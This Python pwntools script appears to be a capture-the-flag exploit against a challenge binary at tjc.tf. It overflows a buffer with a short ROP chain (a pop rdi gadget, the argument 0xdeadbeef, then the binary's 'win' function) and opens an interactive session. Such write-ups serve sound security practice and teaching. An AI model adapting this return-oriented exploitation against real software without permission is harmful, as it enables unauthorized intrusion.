#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './out' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'tjc.tf', 31457 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================




# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    pop_rdi = 0x000000000040117a
    offset = 16
    payload = flat({
        offset: [
            pop_rdi,
            0xdeadbeef,
            # rop.ret.address,
            elf.sym['win']
        ]
    })
    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()